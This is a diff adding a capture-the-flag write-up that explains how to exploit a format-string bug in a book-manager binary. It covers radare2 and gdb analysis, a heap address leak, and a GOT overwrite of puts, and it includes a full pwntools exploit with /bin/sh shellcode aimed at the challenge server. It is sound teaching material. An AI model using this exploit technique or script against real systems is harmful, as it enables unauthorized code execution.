@@ -291,6 +291,575 @@ flag{aniceflag}
         </div>
         <!-- End of writeup -->
 
+        <!-- Start of writeup -->
+<div class="col-lg-12">
+
+    <hr>
+
+    <!-- Blog Post -->
+    <h1>Exploitation 200</h1>
+
+    <hr>
+
+    <!-- Date/Time -->
+    <p><i class="fa fa-clock-o"></i> Posted on February 15, 2017 at 8:00 PM</p>
+
+    <hr>
+
+
+    <p class="lead">This is a simple program; there's probably nothing exploitable right? It just works with simple strings! 
+      Exploit the daemon at 34.198.96.6:9001</p>
+
+
+    <hr>
+
+    <p>
+      The program that they provide and that is running on the server is a simple book managing application. You can insert new books, list existing books, search books, and delete books.
+      Lets play with the program a bit to get a sense of how it works, keeping in mind the hint. This has something to do with strings which suggests we are looking for a buffer overflow
+      or a format string exploit.
+    </p> 
+
+    <pre><code>
+Book Manager:                     
+    [1] Insert                    
+    [2] List                      
+    [3] Search                    
+    [4] Delete                    
+    [5] Exit                      
+
+Enter choice: 1                   
+Enter book name: fancy book       
+Enter book id: 0                  
+    </code></pre>
+
+    <p>
+      You can insert books, give them a name and an id number. What happens when we list them?
+    </p>
+
+    <pre><code>
+Enter choice: 2          
+    [0] fancy book       
+    </code></pre>
+
+    <p>
+      The program just seems to print out a list of books you've previously inserted. What about searching?
+    </p>
+
+    <pre><code>
+Enter choice: 3                                         
+Search by book_id or name (name:abc, book_id:123)       
+Enter query: book_id:0                                  
+Searching with: book_id:0                               
+��                                                    
+FOUND                                                   
+[0] fancy book                                          
+    </code></pre>
+
+    <p>
+      We can search books either by name or by book_id. Searching for the book id we previously inserted prints out some strange characters. Lets play around with this and see if
+      there is anything exploitable here. Maybe this is vulnerable to a format string exploit?
+    </p>
+
+    <pre><code>
+Enter choice: 3                                         
+Search by book_id or name (name:abc, book_id:123)       
+Enter query: %08x %08x %08x                             
+Searching with: ffce596c 00000400 f77a153c              
+    </code></pre>
+
+    <p>
+      Hey! We managed to print out some values from the stack! We have found a vulnerability. Now we just need to exploit this.
+    </p>
+
+    <p>
+      Lets open up this program in radare2 to get a better sense of what's happening.
+    </p>
+
+    <pre class="prettyprint">
+      <code class="language-python">
+$ r2 level1.bin                                                                                                    
+[0x080485c0]> aaaa                                                                                                 
+[0x080485c0]> is | grep 'bind=LOCAL type=FUNC'                                                                     
+vaddr=0x08048600 paddr=0x00000600 ord=030 fwd=NONE sz=0 bind=LOCAL type=FUNC name=deregister_tm_clones        
+vaddr=0x08048630 paddr=0x00000630 ord=031 fwd=NONE sz=0 bind=LOCAL type=FUNC name=register_tm_clones          
+vaddr=0x08048670 paddr=0x00000670 ord=032 fwd=NONE sz=0 bind=LOCAL type=FUNC name=__do_global_dtors_aux       
+vaddr=0x08048690 paddr=0x00000690 ord=035 fwd=NONE sz=0 bind=LOCAL type=FUNC name=frame_dummy                 
+vaddr=0x080486bb paddr=0x000006bb ord=039 fwd=NONE sz=176 bind=LOCAL type=FUNC name=insert                    
+vaddr=0x0804876b paddr=0x0000076b ord=040 fwd=NONE sz=586 bind=LOCAL type=FUNC name=search                    
+vaddr=0x080489b5 paddr=0x000009b5 ord=041 fwd=NONE sz=252 bind=LOCAL type=FUNC name=delete                    
+vaddr=0x08048ab1 paddr=0x00000ab1 ord=042 fwd=NONE sz=92 bind=LOCAL type=FUNC name=list                       
+vaddr=0x08048b0d paddr=0x00000b0d ord=043 fwd=NONE sz=272 bind=LOCAL type=FUNC name=menu                      
+      </code>
+    </pre>
+
+    <p>
+      Here we have a list of the locally defined functions. This is pretty much what we expected from the functioning of the program.
+      There seems to be a function for displaying the menu, and then doing all the actions we saw from the program. Let's look at the disassembly of our vulnerable function, search.
+    </p>
+
+    <pre class="prettyprint">
+      <code class="language-python">
+[0x080485c0]> s sym.search
+[0x0804876b]> VV
+                     ┌───────────────────────────────────────────────┐
+                     │  0x804899f ;[d]                               │
+                     │      ; JMP XREF from 0x0804899c (sym.search)  │
+                     │      ; JMP XREF from 0x08048979 (sym.search)  │
+                     │      ; JMP XREF from 0x080487ae (sym.search)  │
+                     │ mov eax, dword [ebp - local_ch]               │
+                     │ xor eax, dword gs:[0x14]                      │
+                     │ je 0x80489b0 ;[z]                             │
+                     └───────────────────────────────────────────────┘
+                             f t
+             ┌───────────────┘ └───────────────────────┐
+             │                                         │
+             │                                         │
+     ┌─────────────────────────────────────┐     ┌─────────────────────────────────┐
+     │  0x80489ab ;[Ab]                    │     │  0x80489b0 ;[z]                 │
+     │ call sym.imp.__stack_chk_fail ;[Aa] │     │ mov ebx, dword [ebp - local_4h] │
+     └─────────────────────────────────────┘     │ leave                           │
+                                                 │ ret                             │
+                                                 └─────────────────────────────────┘
+      </code>
+    </pre>
+
+    <p>
+      The function is long. Above is the final few blocks of the function. These blocks indicate that stack canaries have been enabled and we won't be able to simply smash the stack.
+      We will have to be a little more creative. We will get control of the instruction pointer by overwriting a value of the Global Offset Table (GOT). Let's choose a function
+      that's executed in <code>sym.menu</code> so that our exploit is run when the menu is displayed, or after every command.
+    </p>
+
+    <pre class="prettyprint">
+      <code class="language-python">
+[0x0804876b]> s sym.menu
+[0x08048b0d]> pdf
+┌ (fcn) sym.menu 383
+│   sym.menu ();
+│           ; var int local_14h @ ebp-0x14
+│           ; var int local_10h @ ebp-0x10
+│           ; var int local_ch @ ebp-0xc
+│              ; CALL XREF from 0x08048c2e (sym.main)
+│           0x08048b0d      55             push ebp
+│           0x08048b0e      89e5           mov ebp, esp
+│           0x08048b10      83ec18         sub esp, 0x18
+│           0x08048b13      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=1
+│           0x08048b19      8945f4         mov dword [ebp - local_ch], eax
+│           0x08048b1c      31c0           xor eax, eax
+│           0x08048b1e      c745f0000000.  mov dword [ebp - local_10h], 0
+│       ┌─< 0x08048b25      e9d5000000     jmp loc.08048bff
+│       │   0x08048b2a      83ec0c         sub esp, 0xc
+│       │   0x08048b2d      68b38d0408     push str.Book_Manager: ; str.Book_Manager: ; "Book Manager:" @ 0x8048db3 ; const char * s
+│       │   0x08048b32      e819faffff     call sym.imp.puts          ; int puts(const char *s)
+│       │   0x08048b37      83c410         add esp, 0x10
+│       │   0x08048b3a      83ec0c         sub esp, 0xc
+│       │   0x08048b3d      68c18d0408     push str._t_1__Insert ; str._t_1__Insert ; str._t_1__Insert ; const char * s
+│       │   0x08048b42      e809faffff     call sym.imp.puts          ; int puts(const char *s)
+│       │   0x08048b47      83c410         add esp, 0x10
+│       │   0x08048b4a      83ec0c         sub esp, 0xc
+│       │   0x08048b4d      68cd8d0408     push str._t_2__List ; str._t_2__List ; str._t_2__List ; const char * s
+│       │   0x08048b52      e8f9f9ffff     call sym.imp.puts          ; int puts(const char *s)
+│       │   0x08048b57      83c410         add esp, 0x10
+│       │   0x08048b5a      83ec0c         sub esp, 0xc
+│       │   0x08048b5d      68d78d0408     push str._t_3__Search ; str._t_3__Search ; str._t_3__Search ; const char * s
+│       │   0x08048b62      e8e9f9ffff     call sym.imp.puts          ; int puts(const char *s)
+│       │   0x08048b67      83c410         add esp, 0x10
+│       │   0x08048b6a      83ec0c         sub esp, 0xc
+│       │   0x08048b6d      68e38d0408     push str._t_4__Delete ; str._t_4__Delete ; str._t_4__Delete ; const char * s
+│       │   0x08048b72      e8d9f9ffff     call sym.imp.puts          ; int puts(const char *s)
+│       │   0x08048b77      83c410         add esp, 0x10
+│       │   0x08048b7a      83ec0c         sub esp, 0xc
+│       │   0x08048b7d      68ef8d0408     push str._t_5__Exit ; str._t_5__Exit ; str._t_5__Exit ; const char * s
+│       │   0x08048b82      e8c9f9ffff     call sym.imp.puts          ; int puts(const char *s)
+│       │   0x08048b87      83c410         add esp, 0x10
+│       │   0x08048b8a      83ec0c         sub esp, 0xc
+│       │   0x08048b8d      6a0a           push 0xa                    ; int c
+│       │   0x08048b8f      e8ecf9ffff     call sym.imp.putchar       ; int putchar(int c)
+│       │   0x08048b94      83c410         add esp, 0x10
+│       │   0x08048b97      83ec0c         sub esp, 0xc
+│       │   0x08048b9a      68f98d0408     push str.Enter_choice: ; str.Enter_choice: ; "Enter choice: " @ 0x8048df9
+│       │   0x08048b9f      e84cf9ffff     call sym.imp.printf        ; int printf(const char *format)
+│       │   0x08048ba4      83c410         add esp, 0x10
+│       │   0x08048ba7      83ec08         sub esp, 8
+│       │   0x08048baa      8d45ec         lea eax, [ebp - local_14h]
+│       │   0x08048bad      50             push eax
+│       │   0x08048bae      68f28c0408     push 0x8048cf2              ; const char * format
+│       │   0x08048bb3      e8d8f9ffff     call sym.imp.__isoc99_scanf; int scanf(const char *format)
+│       │   0x08048bb8      83c410         add esp, 0x10
+│       │   0x08048bbb      8b45ec         mov eax, dword [ebp - local_14h]
+│       │   0x08048bbe      83f806         cmp eax, 6
+│      ┌──< 0x08048bc1      773c           ja loc.08048bff
+│      ││   0x08048bc3      8b0485088e04.  mov eax, dword [eax*4 + 0x8048e08] ; [0x8048e08:4]=0x8048bff loc.08048bff
+└      ││   0x08048bca      ffe0           jmp eax
+├ loc.08048bff 30
+│   loc.08048bff ();
+│       ↑   ; var int local_14h @ ebp-0x14
+│       ↑   ; var int local_10h @ ebp-0x10
+│       ↑   ; var int local_ch @ ebp-0xc
+│       ↑   0x08048bff      837df000       cmp dword [ebp - local_10h], 0
+│       └─< 0x08048c03      0f8421ffffff   je 0x8048b2a               ; sym.menu+0x1d
+│           0x08048c09      90             nop
+│           0x08048c0a      8b45f4         mov eax, dword [ebp - local_ch]
+│           0x08048c0d      653305140000.  xor eax, dword gs:[0x14]
+│       ┌─< 0x08048c14      7405           je 0x8048c1b
+│       │   0x08048c16      e815f9ffff     call sym.imp.__stack_chk_failvoid)
+│       └─> 0x08048c1b      c9             leave
+└           0x08048c1c      c3             ret
+      </code>
+    </pre>
+
+    <p>
+      Radare2 denotes imported functions with <code>sym.imp</code>. <code>sym.imp.puts</code> seems as good as any to overwrite. Lets figure out where the GOT entry for this is. 
+    </p>
+
+    <pre class="prettyprint">
+      <code class="language-python">
+[0x0804876b]> pdf @ sym.imp.puts 
+┌ (fcn) sym.imp.puts 6
+│   sym.imp.puts ();
+└           0x08048550      ff252cb00408   jmp dword [reloc.puts_44]   ; "V...f...v..............." @ 0x804b02c
+
+[0x0804876b]> pv @ reloc.puts_44 
+0x08048556
+
+[0x0804876b]> pf.obj.value @ reloc.puts_44 
+0x0804b02c = (octal)  01001102526
+0x0804b030 = 0x66
+      </code>
+    </pre>
+
+    <p>
+      Radare2 is telling us that <code>sym.imp.puts</code> jumps to the location <code>reloc.puts_44</code> that contains the value <code>0x08048556</code>
+      The address of <code>reloc.puts_44</code> is <code>0x0804b02c</code>. If we overwrite the value at this address with a pointer to some shellcode, we will have completed the challenge.
+      So, how do we do this and where will this shellcode come from? If book names are saved on the heap, we can write shellcode to the heap, and redirect execution to that.
+      Let's look at the disassembly for <code>sym.insert</code> to figure out how books are saved.
+    </p>
+
+    <pre class="prettyprint">
+      <code class="language-python">
+[0x0804876b]> s sym.insert
+[0x080486bb]> pdf
+┌ (fcn) sym.insert 176
+│   sym.insert ();
+│           ; var int local_ch @ ebp-0xc
+│              ; CALL XREF from 0x08048bcc (unk)
+│           0x080486bb      55             push ebp
+│           0x080486bc      89e5           mov ebp, esp
+│           0x080486be      83ec18         sub esp, 0x18
+│           0x080486c1      83ec0c         sub esp, 0xc
+│           0x080486c4      6809040000     push 0x409                  ; size_t size
+│           0x080486c9      e872feffff     call sym.imp.malloc        ;  void *malloc(size_t size)
+│           0x080486ce      83c410         add esp, 0x10
+│           0x080486d1      8945f4         mov dword [ebp - local_ch], eax
+│           0x080486d4      837df400       cmp dword [ebp - local_ch], 0
+│       ┌─< 0x080486d8      0f848a000000   je 0x8048768
+│       │   0x080486de      83ec0c         sub esp, 0xc
+│       │   0x080486e1      68d08c0408     push str.Enter_book_name: ; str.Enter_book_name: ; "Enter book name: " @ 0x8048cd0
+│       │   0x080486e6      e805feffff     call sym.imp.printf        ; int printf(const char *format)
+│       │   0x080486eb      83c410         add esp, 0x10
+│       │   0x080486ee      a14cb00408     mov eax, dword [obj.stdout] ; [0x804b04c:4]=0x3a434347 ; LEA obj.stdout
+│       │   0x080486f3      83ec0c         sub esp, 0xc
+│       │   0x080486f6      50             push eax                    ; FILE *stream
+│       │   0x080486f7      e804feffff     call sym.imp.fflush        ; int fflush(FILE *stream)
+│       │   0x080486fc      83c410         add esp, 0x10
+│       │   0x080486ff      8b45f4         mov eax, dword [ebp - local_ch]
+│       │   0x08048702      83ec04         sub esp, 4
+│       │   0x08048705      6800040000     push 0x400
+│       │   0x0804870a      50             push eax                    ; size_t nbyte
+│       │   0x0804870b      6a00           push 0                      ; int fildes
+│       │   0x0804870d      e8cefdffff     call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte)
+│       │   0x08048712      83c410         add esp, 0x10
+│       │   0x08048715      83ec0c         sub esp, 0xc
+│       │   0x08048718      68e28c0408     push 0x8048ce2              ; const char * format
+│       │   0x0804871d      e8cefdffff     call sym.imp.printf        ; int printf(const char *format)
+│       │   0x08048722      83c410         add esp, 0x10
+│       │   0x08048725      a14cb00408     mov eax, dword [obj.stdout] ; [0x804b04c:4]=0x3a434347 ; LEA obj.stdout
+│       │   0x0804872a      83ec0c         sub esp, 0xc
+│       │   0x0804872d      50             push eax                    ; FILE *stream
+│       │   0x0804872e      e8cdfdffff     call sym.imp.fflush        ; int fflush(FILE *stream)
+│       │   0x08048733      83c410         add esp, 0x10
+│       │   0x08048736      8b45f4         mov eax, dword [ebp - local_ch]
+│       │   0x08048739      0502040000     add eax, 0x402
+│       │   0x0804873e      83ec08         sub esp, 8
+│       │   0x08048741      50             push eax
+│       │   0x08048742      68f28c0408     push 0x8048cf2              ; const char * format
+│       │   0x08048747      e844feffff     call sym.imp.__isoc99_scanf; int scanf(const char *format)
+│       │   0x0804874c      83c410         add esp, 0x10
+│       │   0x0804874f      8b1554b00408   mov edx, dword [obj.book_list] ; [0x804b054:4]=0x75746e75 ; LEA obj.book_list
+│       │   0x08048755      8b45f4         mov eax, dword [ebp - local_ch]
+│       │   0x08048758      899004040000   mov dword [eax + 0x404], edx
+│       │   0x0804875e      8b45f4         mov eax, dword [ebp - local_ch]
+│       │   0x08048761      a354b00408     mov dword [obj.book_list], eax ; [0x804b054:4]=0x75746e75 ; LEA obj.book_list
+│      ┌──< 0x08048766      eb01           jmp 0x8048769
+│      │└─> 0x08048768      90             nop
+│      │       ; JMP XREF from 0x08048766 (sym.insert)
+│      └──> 0x08048769      c9             leave
+└           0x0804876a      c3             ret
+      </code>
+    </pre>
+
+    <p>
+      Let's step through this to understand what's happening.
+    </p>
+
+    <pre class = "prettyprint">
+      <code class = "language-python">
+push 0x409                  ; size_t size
+call sym.imp.malloc        ;  void *malloc(size_t size)
+add esp, 0x10
+mov dword [ebp - local_ch], eax
+cmp dword [ebp - local_ch], 0
+      </code>
+    </pre>
+
+    <p>
+      The program is allocating space on the heap and putting the address in <code>eax</code>.
+      This address is then saved on the stack at a position radare2 is calling <code>local_ch</code>.
+    </p>
+
+    <pre class = "prettyprint">
+      <code class = "language-python">
+push str.Enter_book_name: ; str.Enter_book_name: ; "Enter book name: " @ 0x8048cd0
+call sym.imp.printf        ; int printf(const char *format)
+add esp, 0x10
+mov eax, dword [obj.stdout] ; [0x804b04c:4]=0x3a434347 ; LEA obj.stdout
+sub esp, 0xc
+push eax                    ; FILE *stream
+call sym.imp.fflush        ; int fflush(FILE *stream)
+add esp, 0x10
+mov eax, dword [ebp - local_ch]
+sub esp, 4
+push 0x400
+push eax                    ; size_t nbyte
+push 0                      ; int fildes
+call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte)
+      </code>
+    </pre>
+
+    <p>
+      The program prints <code>"Enter book name: "</code>. Then the address of the heap that the program saved earlier is loaded back into <code>eax</code> and then
+      passed as a parameter to <code>sym.imp.read</code>. This means that the program name is written to the heap just as we had hoped! We will be able to insert our shellcode here!
+      Now we just need to leak the heap address using the format string vulnerability that we discovered earlier. To figure out how to do this, lets load this program into <code>gdb</code>
+      (I'm using the the fantastic peda gdb plugin).
+      Let's set a breakpoint in the insert method where the heap address is moved into <code>local_ch</code> and then another one in the search method right before the vulnerable
+      <code>printf</code> so that we can examine the stack at this point and figure out where the heap address is at this point.
+    </p>
+
+    <pre class = "prettyprint">
+      <code class = "language-python">
+$ gdb level1.bin
+gdb> b *0x080486d1
+Breakpoint 1 at 0x80486d1
+gdb> b *0x080487f5
+Breakpoint 2 at 0x80487f5
+      </code>
+    </pre>
+
+    <p>
+      Now let's run the program.
+    </p>
+
+    <pre class = "prettyprint">
+      <code class = "language-python">
+gdb> r
+Starting program: /home/samthomas/Cornell/CHC/nullcon/exp1/level1 
+Book Manager:
+  [1] Insert
+  [2] List
+  [3] Search
+  [4] Delete
+  [5] Exit
+
+Enter choice: 1
+
+ [----------------------------------registers-----------------------------------]
+EAX: 0x804c818 --> 0x0 
+EBX: 0x0 
+ECX: 0xf7f9c780 --> 0x0 
+EDX: 0x804c818 --> 0x0 
+ESI: 0xf7f9c000 --> 0x1b1db0 
+EDI: 0xf7f9c000 --> 0x1b1db0 
+EBP: 0xffffce38 --> 0xffffce58 --> 0xffffce68 --> 0x0 
+ESP: 0xffffce20 --> 0xf7f9c000 --> 0x1b1db0 
+EIP: 0x80486d1 (<insert+22>:	mov    DWORD PTR [ebp-0xc],eax)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80486c4 <insert+9>:	push   0x409
+   0x80486c9 <insert+14>:	call   0x8048540 <malloc@plt>
+   0x80486ce <insert+19>:	add    esp,0x10
+=> 0x80486d1 <insert+22>:	mov    DWORD PTR [ebp-0xc],eax
+   0x80486d4 <insert+25>:	cmp    DWORD PTR [ebp-0xc],0x0
+   0x80486d8 <insert+29>:	je     0x8048768 <insert+173>
+   0x80486de <insert+35>:	sub    esp,0xc
+   0x80486e1 <insert+38>:	push   0x8048cd0
+[------------------------------------stack-------------------------------------]
+0000| 0xffffce20 --> 0xf7f9c000 --> 0x1b1db0 
+0004| 0xffffce24 --> 0xf7f9c000 --> 0x1b1db0 
+0008| 0xffffce28 --> 0xffffce58 --> 0xffffce68 --> 0x0 
+0012| 0xffffce2c --> 0x8048bb8 (<menu+171>:	add    esp,0x10)
+0016| 0xffffce30 --> 0x8048cf2 --> 0x42006425 ('%d')
+0020| 0xffffce34 --> 0xffffce44 --> 0x1 
+0024| 0xffffce38 --> 0xffffce58 --> 0xffffce68 --> 0x0 
+0028| 0xffffce3c --> 0x8048bd1 (<menu+196>:	jmp    0x8048bff <menu+242>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080486d1 in insert ()
+      </code>
+    </pre>
+
+    <p>
+      Notice that the value in <code>eax</code> is <code>0x804c818</code>. Now lets see if we can find this on the stack in the search method. Continue execution of the program.
+    </p>
+
+    <pre class = "prettyprint">
+      <code class = "language-python">
+gdb$ c
+Continuing.
+Enter book name: AAAABBBBCCCCDDDD
+Enter book id: 0
+Book Manager:
+  [1] Insert
+  [2] List
+  [3] Search
+  [4] Delete
+  [5] Exit
+
+Enter choice: 3
+Search by book_id or name (name:abc, book_id:123)
+Enter query: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+ [----------------------------------registers-----------------------------------]
+EAX: 0x25 ('%')
+EBX: 0x0 
+ECX: 0xffffca2c ('A' <repeats 36 times>, "\n")
+EDX: 0x400 
+ESI: 0xf7f9c000 --> 0x1b1db0 
+EDI: 0xf7f9c000 --> 0x1b1db0 
+EBP: 0xffffce38 --> 0xffffce58 --> 0xffffce68 --> 0x0 
+ESP: 0xffffca00 --> 0x8048d48 ("Searching with: ")
+EIP: 0x80487f5 (<search+138>:	call   0x80484f0 <printf@plt>)
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80487ea <search+127>:	add    esp,0x10
+   0x80487ed <search+130>:	sub    esp,0xc
+   0x80487f0 <search+133>:	push   0x8048d48
+=> 0x80487f5 <search+138>:	call   0x80484f0 <printf@plt>
+   0x80487fa <search+143>:	add    esp,0x10
+   0x80487fd <search+146>:	sub    esp,0xc
+   0x8048800 <search+149>:	lea    eax,[ebp-0x40c]
+   0x8048806 <search+155>:	push   eax
+Guessed arguments:
+arg[0]: 0x8048d48 ("Searching with: ")
+[------------------------------------stack-------------------------------------]
+0000| 0xffffca00 --> 0x8048d48 ("Searching with: ")
+0004| 0xffffca04 --> 0xffffca2c ('A' <repeats 36 times>, "\n")
+0008| 0xffffca08 --> 0x400 
+0012| 0xffffca0c --> 0xf7ffd53c --> 0xf7fd9000 --> 0x464c457f 
+0016| 0xffffca10 --> 0x42a5a955 
+0020| 0xffffca14 --> 0xf7fe253d (add    esp,0x20)
+0024| 0xffffca18 --> 0x1 
+0028| 0xffffca1c --> 0x804c818 ("AAAABBBBCCCCDDDD\n")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x080487f5 in search ()
+      </code>
+    </pre>
+
+    <p>
+      Hey! There's the address of the heap! It's the 8th address on the stack. However, the top address will be popped off when <code>printf</code> is executed.
+      So if we leak the 7th value of the stack, we will have the address of our inserted shellcode.
+    </p>
+
+    <p>
+      The last thing that we need is the offset of our input string on the stack.
+    </p>
+
+    <pre class = "prettyprint">
+      <code class = "language-python">
+gdb$ x/24wx $esp
+0xffffca00:	0x08048d48	0xffffca2c	0x00000400	0xf7ffd53c
+0xffffca10:	0x42a5a955	0xf7fe253d	0x00000001	0x0804c818
+0xffffca20:	0x00000000	0x0000000e	0xf7fd94c4	0x41414141
+0xffffca30:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffca40:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffca50:	0x0000000a	0xf7fd94c4	0xf7fd93c4	0x02152d4a
+      </code>
+    </pre>
+
+    <p>
+      The 12th value of the stack is where our input string begins (0x41 = 'A'). For the same reason as above, the input string offset is actually 11.
+    </p>
+
+    <p>
+      We are almost ready to write our exploit! Let's quickly go over our plan. We will insert some shellcode as the name of a book.
+      Then, we will use the format string vulnerability to leak the address of the heap. Then, we will use the format string specifier <code>%n</code> to replace
+      the GOT entry for <code>puts</code> with the leaked address of the heap. This will execute the shellcode and we will have pwned the system. Let's write a python script to do this!
+    </p>
+
+    <pre class = "prettyprint">
+      <code class = "language-python">
+from pwn import *
+import sys
+
+def inject_shellcode(p):
+    shellcode = "\x90"*8 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+    p.sendline("1")
+    p.sendline(shellcode)
+    p.recvuntil("Enter book id: ")
+    p.sendline("1")
+    log.info("Shellcode Injected")
+
+def leak_heap_address(p):
+    p.sendline("3")
+    p.recvuntil("Enter query: ")
+    p.sendline("%7$08x")
+    heap_addr = p.recvline()[16:-1]
+    log.info("Leaked Heap Address: 0x{}".format(heap_addr))
+    return heap_addr
+
+def pwn(p, addr):
+    p.sendline("3")
+    p.recvuntil("Enter query: ")
+
+    got = 0x0804b02c
+    payload = fmtstr_payload(11, {got : int(addr, 16)})
+
+    log.info("Using Fmt String: " + payload)
+    p.sendline(payload)
+    log.info("Pwned System")
+    p.interactive()
+
+def exploit(p):
+    inject_shellcode(p)
+    heap_addr = leak_heap_address(p)
+    pwn(p, heap_addr)
+    p.recv()
+
+if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        child = remote("34.198.96.6", 9001)
+        pause()
+        exploit(child)
+    else:
+        child = process(["level1"])
+        pause()
+        exploit(child)
+      </code>
+    </pre>
+
+    <p>
+      I found some suitable shellcode at <a href="http://shell-storm.org/shellcode/">shell-storm.org</a>.
+      I'm using the pwn library for python which provides a lot of nice convenience functions including format string payload generation.
+    </p>
+
+    <p>
+      Running this script gives us access to the system. Type <code>cat flag.txt</code> to get the flag.
+    </p>
+
+</div>
+    <!-- End of writeup -->
+
     </div>
     <!-- Writeup Content End-->
 
